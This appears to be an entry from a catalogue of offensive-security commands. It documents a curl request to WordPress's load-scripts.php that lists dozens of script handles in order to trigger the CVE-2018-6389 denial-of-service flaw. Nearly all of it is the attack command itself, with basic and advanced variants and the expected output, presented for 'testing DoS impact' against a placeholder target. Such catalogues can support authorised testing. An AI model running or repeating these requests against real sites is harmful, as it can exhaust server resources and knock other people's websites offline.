---
id: cmd-uuid-1
data: >-
  curl
  "https://target.com/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,quicktags,svg-painter,jquery,jquery-core,jquery-migrate,utils,wplink,wp-emoji-release,underscore,shortcode,media-upload,word-count,media-editor,media-views,media-models,wp-plupload,plupload-all,wp-editor,editor,wp-medialib-widget,mce-view,wp-api,heartbeat,buttons,wp-auth-check,svg-filter,jquery-ui-core,jquery-ui-widget,jquery-ui-mouse,jquery-ui-sortable,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-slider,jquery-ui-button,jquery-ui-position,jquery-ui-dialog,jquery-ui-datepicker,jquery-ui-progressbar,jquery-ui-tabs,wp-backbone,wp-util,wp-settings,thickbox,shortcode"
  -o response.js
tags:
  - dos
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.132Z'
verified: false
validated: true
submitted: true
---
# curl-wordpress-load-scripts-dos

## Command

```bash
curl "https://target.com/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,quicktags,svg-painter,jquery,jquery-core,jquery-migrate,utils,wplink,wp-emoji-release,underscore,shortcode,media-upload,word-count,media-editor,media-views,media-models,wp-plupload,plupload-all,wp-editor,editor,wp-medialib-widget,mce-view,wp-api,heartbeat,buttons,wp-auth-check,svg-filter,jquery-ui-core,jquery-ui-widget,jquery-ui-mouse,jquery-ui-sortable,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-slider,jquery-ui-button,jquery-ui-position,jquery-ui-dialog,jquery-ui-datepicker,jquery-ui-progressbar,jquery-ui-tabs,wp-backbone,wp-util,wp-settings,thickbox,shortcode" -o response.js
```

## Description

Sends a GET request to the WordPress load-scripts.php endpoint with a long list of script handles in the 'load' parameter to trigger CVE-2018-6389, generating ~3MB of data. Use for testing DoS impact.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target endpoint with load parameter | Yes |
| -o | Output file for response | No |

## Examples

### Basic Usage

```bash
curl "https://target.com/wp-admin/load-scripts.php?load=common,jquery" -o small.js
```

### Advanced Usage

```bash
curl -s -w "%{size_download} bytes\n" "https://target.com/wp-admin/load-scripts.php?load=[extended-list]" -o large.js
```

## Expected Output

Large JavaScript file saved to response.js (~3MB), with potential delays due to server processing. Check size: `ls -lh response.js`.

## Related

- [[Related Procedure: Craft-GET-Request-for-Large-Data-Generation]]
